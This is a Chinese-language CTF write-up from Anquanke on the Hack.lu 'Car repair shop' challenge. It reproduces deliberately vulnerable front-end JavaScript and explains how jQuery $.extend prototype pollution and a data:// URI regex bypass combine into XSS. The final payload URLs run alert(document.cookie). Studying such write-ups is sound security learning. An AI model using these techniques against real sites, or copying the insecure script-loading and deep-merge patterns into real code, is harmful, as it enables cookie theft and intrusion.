# Hack.luCTF-Car-repair-shop详解

阅读量 **827419**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-10-30 16:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

JS题目，代码全在前端，合并一下关键代码如下：

    
    
    const urlParams = new URLSearchParams(window.location.search)
    const h = location.hash.slice(1)
    const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
    const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
    
    const cars = [bugatti, porsche]
    
    porsche.repair = () => {
        if(!bugatti.isStarted()){
            infobox(`Not so fast. Repair the other car first!`)
        }
        else if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15'){
            if(urlParams.has('help')) {
                repairWithHelper(urlParams.get('help'))
            }
        }
        else{
            infobox(`Repairing this is not that easy.`)
        }
    }
    porsche.ignition = () => {
        infobox(`Hmm ... WTF!`)
    }
    
    $(document).ready(() => {
        const [car] = cars
        $('.fa-power-off').click(() => car.powerOn())
        $('.fa-car').click(() => car.info())
        $('.fa-lightbulb-o').click(() => car.light())
        $('.fa-battery-quarter').click(() => car.battery())
        $('.fa-key').click(() => car.ignition())
        $('.fa-wrench').click(() => car.repair())
    
        $('.fa-step-forward').click(() => nextCar())
    
        if(h.includes('Bugatti'))
            autoStart(bugatti)
        if(h.includes('Porsche'))
            autoStart(porsche)
    })
    
    
    const nextCar = () => {
        cars.push(cars.shift())
        $(".image").attr('src', cars[0].pic);
    }
    
    
    const autoStart = (car) => {
        car.repair()
        car.ignition()
        car.powerOn()
    }
    
    
    const repairWithHelper = (src) => {
        /* who needs csp anyways !? */
        urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
        if (urlRegx.test(src)) {
            let s = document.createElement('script')
            s.src = src
            $('head').append(s)
        }
    }
    
    
    const infobox = (text) => {
        $('a').css({'pointer-events': 'none', 'border': 'none'})
        $('.infobox').addClass('infoAnimate')
            .text(text)
            .on('animationend', function() {
                $(this).removeClass('infoAnimate')
                $('a').css({'pointer-events': 'all', 'border': 'solid 1px rgba(255, 255, 255, .25)'})
        })
    
    }
    
    class Car {
        constructor(type, model, color, pic, key="") {
            this.type = type
            this.model = model
            this.color = color
            this.key = key
            this.pic = pic
    
            let started = false
            this.start = () => {
                started = true
            }
            this.isStarted = () => {
                return started
            }
        }
        powerOn() {
            if (this.isStarted()) {
                infobox(`Well Done!`)
                nextCar()
    
            } else {
                $('.chargeup')[0].play()
            }
        }
        info() {
            infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
        }
        repair() {
            if(urlParams.has('repair')) {
                $.extend(true, this, JSON.parse(urlParams.get('repair')))
            }
        }
        light() {
            infobox(`You turn on the lights ... Nothing happens.`)
        }
        battery() {
            infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
        }
        ignition() {
            if (this.key == "") {
                infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
            }
            if (this.key == "🔑") {
                infobox(`The car started!`)
                this.start()
            }
        }
    }
    
    <!-- <script src="assets/js/car.key.js"></script> -->
    

根据题目和代码逻辑，首先生成了两个常量对象`bugatti`和`porsche`

    
    
    const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
    const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
    

通读代码找一下能够x的点，发现在`repairWithHelper`函数中存在script
src可控的情况，不过传入的url要经过一个正则的限制。我们首先追一下怎么能调用到`repairWithHelper`函数

    
    
    const repairWithHelper = (src) => {
        /* who needs csp anyways !? */
        urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
        if (urlRegx.test(src)) {
            let s = document.createElement('script')
            s.src = src
            $('head').append(s)
        }
    }
    

Jquery加载完dom之后，取锚点的值为h，并判断是否包含bugatti、porsche字段值，而后将对象传入相应的autoStart函数执行。

    
    
    if(h.includes('Bugatti'))
        autoStart(bugatti)
    if(h.includes('Porsche'))
        autoStart(porsche)
    

autoStart中对car对象的调用方法不尽相同。对于bugatti来说，Car类中存在上述三个方法，而当对象为porsche的时候，方法ignition、repair会被改写。其中，在`porsche.repair()`方法中实现了`repairWithHelper`调用

    
    
    const autoStart = (car) => {
        car.repair()
        car.ignition()
        car.powerOn()
    }
    

省略中间步骤，梳理一下调用链大致需要经过两个重要的逻辑：

1、需要先repair第一辆名为”Bugatti”的车，改变bugatti.key = 🔑  
2、使$.md5(porsche) == $.md5(“lol”)

先看第一个点，由于Car类内部`ignition()`方法调用了$extend，同时获取url参数`repair`用来合并Car类内属性，那么就可以通过传参覆盖key的值，因此构造`repair={"key":"%F0%9F%94%91"}`就能轻松过第一个步骤。

    
    
    repair() {
        if(urlParams.has('repair')) {
            $.extend(true, this, JSON.parse(urlParams.get('repair')))
        }
    }
    

同时$extend()方法也存在原型链污染问题，见文章:https://hackerone.com/reports/454365。这也是bypass第二步$.md5(porsche)
== $.md5(“lol”)的关键，那么如何操作对象常量porsche？

首先，可以先看下面的取值

![](https://p4.ssl.qhimg.com/t01075444c8a5f52916.png)

因为$.md5是对一串string类型的变量进行加密，那么传入的参数为对象时，势必就经过类型的转换。至于具体操作，我们可以把它理解为当前变量进行`toString()`。由于porsche这个对象没有`toString()`方法，按照Javascript的继承就会向上查找原型_
_proto
**(Car对象)是否有`toString()`，Car对象也没有`toString()`，继而再向上查找到**proto__(Object对象)，存在toString()，调用并返回字符串：
**[object Object]** ，通过打印如下的例子验证。

![](https://p2.ssl.qhimg.com/t015444ad34a08f5306.png)

其次，对于数组的toString()会合并数组内的键值并返回，那么如下的用法会使$.md5生成以”lol”为字符串的加密值。

![](https://p5.ssl.qhimg.com/t019d49d9563a3ad1ca.png)

因此，既然是将porsche对象进行$.md5的取值，那么我们污染继承链的某一个_ _proto__
，使其为array类型，并赋值为”lol”，那么toString()在向上寻找调用的时候就能返回”lol”，而不是到达顶端Object原型的toString()方法。

综上，我们可以构造如下payload绕过以上两点的限制：

    
    
    https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?&repair={"key":"%F0%9F%94%91","__proto__":{"__proto__":["lol"]}}#PorscheBugatti
    

![](https://p5.ssl.qhimg.com/dm/1024_121_/t01e54e79378e89cfd1.png)

接着就是以help为参数的引入script标签的src，不过要先bypass一段正则:

    
    
    urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
    

这里是不可能污染原型的，因为会被重新赋值。可控点为car-repair-shop前后的字段。

参考官方wp解法，由于w{4,5}使得协议可控，用data://作为资源加载恶意的xss，同时data不关心mime的类型，使得我们可以把白名单的host放到mime的位置。其实对于src这个属性来说，应该是都支持data资源的调用。最终payload如下:

    
    
    https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/hpdoger/,alert(document.cookie)//car.key.js&repair={"key":"🔑","__proto__":{"__proto__":["lol"]}}#BugattiPorsche
    

![](https://p5.ssl.qhimg.com/t019fd50377d6fa6b63.png)

javascript调用链及类型转换真的可以去深究一下，师傅们博学多识,orz..

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Hpdoger** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/189701](/post/id/189701)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://p5.ssl.qhimg.com/t01b9b27da71ece1d6b.png) Hpdoger

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

